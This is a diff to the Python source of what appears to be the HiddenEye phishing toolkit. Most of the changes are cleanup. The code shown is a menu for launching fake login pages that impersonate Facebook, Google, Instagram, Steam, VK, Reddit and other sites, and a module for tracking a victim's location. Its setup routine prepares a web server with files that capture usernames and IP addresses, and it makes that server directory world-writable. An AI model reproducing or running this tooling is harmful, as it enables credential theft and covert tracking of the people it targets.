@@ -25,23 +25,14 @@ def start_main_menu():
     print(localization.lang_start_main_menu["down_line"])
     print(localization.lang_start_main_menu["attack_vector_message"])
     print(localization.lang_start_main_menu["phishing_modules_header"])
-
-    #phishing_col_width = max(len(word) for row in phishing_modules_list for word in row) + 2
-    #for row in phishing_modules_list:
-        #print("".join(word.ljust(phishing_col_width) for word in row).format(default_palette[0], default_palette[2]))                         
     print_sorted_as_menu(localization.lang_start_main_menu["phishing_modules_list"])
     print(localization.lang_start_main_menu["additional_modules"])
-
-    #additional_col_width = max(len(word) for row in additional_modules_list for word in row) + 2
-    #for row in additional_modules_list:
-        #print("".join(word.ljust(additional_col_width) for word in row).format(default_palette[0], default_palette[2]))
     print_sorted_as_menu(localization.lang_start_main_menu["additional_modules_list"])
 
     option = input(global_localization.input_line)
     option = option.zfill(2)
     if option == '01':
         module_loading_message('Facebook')
-        #customOption = input("\nOperation mode:\n {0}HiddenEye >>> {1}".format(default_palette[0], default_palette[2]))
         print(localization.lang_start_main_menu["operation_mode"])
         print_sorted_as_menu(localization.lang_start_main_menu["facebook_operation_modes"])
         customOption = input(global_localization.input_line)
@@ -50,8 +41,6 @@ def start_main_menu():
         module_loading_message('Google')
         print(localization.lang_start_main_menu["operation_mode"])
         print_sorted_as_menu(localization.lang_start_main_menu["google_operation_modes"])
-        #customOption = input(
-        #\n{0}HiddenEye >>> {1}".format(default_palette[0], default_palette[2]))
         customOption = input(global_localization.input_line)
         start_phishing_page('Google', customOption)
     elif option == '03':
@@ -76,7 +65,6 @@ def start_main_menu():
         start_phishing_page('Twitter', customOption)
     elif option == '08':
         module_loading_message('Instagram')
-        #customOption = input("\nOperation mode:\n n{0}HiddenEye >>> {1}".format(default_palette[0], default_palette[2]))
         print(localization.lang_start_main_menu["operation_mode"])
         print_sorted_as_menu(localization.lang_start_main_menu["instagram_operation_modes"])
         customOption = input(global_localization.input_line)
@@ -103,8 +91,6 @@ def start_main_menu():
         start_phishing_page('Steam', customOption)
     elif option == '14':
         module_loading_message('VK')
-        #customOption = input(
-        #    "\nOperation mode:\n
         print(localization.lang_start_main_menu["operation_mode"])
         print_sorted_as_menu(localization.lang_start_main_menu["VK_operation_modes"])
         customOption = input(global_localization.input_line)
@@ -191,8 +177,6 @@ def start_main_menu():
         start_phishing_page('Yandex', customOption)
     elif option == '35':
         module_loading_message('Reddit')
-        #customOption = input(
-        #    "\nOperation mode:\nHiddenEye >>> {1}".format(default_palette[0], default_palette[2]))
         print(localization.lang_start_main_menu["operation_mode"])
         print_sorted_as_menu(localization.lang_start_main_menu["reddit_operation_modes"])
         customOption = input(global_localization.input_line)
@@ -217,13 +201,12 @@ def start_main_menu():
         module_loading_message('CUSTOM(2)')
         customOption = ''
         start_phishing_page('CUSTOM(2)', customOption)
-    
-    #Below Are Tools And Above Are Phishing Modules..
+
+
+        '''PHISHING MODULES BELOW'''
 
     elif option == '0A':
         module_loading_message('LOCATION')
-        #customOption = input(
-        #    "\nOperation mode:\n \n\n{0}HiddenEye >>> {1}".format(default_palette[0], default_palette[2]))
         print(localization.lang_start_main_menu["operation_mode"])
         print_sorted_as_menu(localization.lang_start_main_menu["additional_module_location_operation_modes"])
         customOption = input(global_localization.input_line)
@@ -234,11 +217,9 @@ def start_main_menu():
 
 
 def start_phishing_page(page, custom_option):  # Phishing pages selection menu
-    #chmod('Server', 777)
     run_command(['chmod',  '-R', '777', 'Server'])
     rmtree("Server/www", onerror=simple_informant.remove_readonly)
     mkdir('Server/www')
-    #chmod('Server/www', 777)
     pathlib_Path('Server/www/usernames.txt').touch()
     pathlib_Path('Server/www/ip.txt').touch()
     copyfile('WebPages/ip.php', 'Server/www/ip.php')
@@ -363,7 +344,6 @@ def start_phishing_page(page, custom_option):  # Phishing pages selection menu
         print(localization.lang_start_phishing_page["copying_your_files"])
         wait(3)
         webpage_set('WebPages/CUSTOM(2)/', "Server/www/")
-    
 
     # Tools Below && Phishing Pages Above
     elif custom_option == '1' and page == 'LOCATION':
@@ -386,7 +366,6 @@ def start_phishing_page(page, custom_option):  # Phishing pages selection menu
 
 def enter_custom_redirecting_url():  # Question where user can input custom web-link
     run_command('clear')
-    
     print(global_localization.hidden_eye_logo)
     print(global_localization.official_website_link)
     print(global_localization.by_darksec)
@@ -398,8 +377,8 @@ def enter_custom_redirecting_url():  # Question where user can input custom web-
     else:
         custom = 'http://' + custom
 
-    if path.exists('Server/www/js/location.js'): # For Location (gdrive) Template Redirection. 
-        with open('Server/www/js/location.js') as f: 
+    if path.exists('Server/www/js/location.js'): # For Location (gdrive) Template Redirection.
+        with open('Server/www/js/location.js') as f:
             read_data = f.read()
         c = read_data.replace('<CUSTOM>', custom)
         f = open('Server/www/js/location.js', 'w')
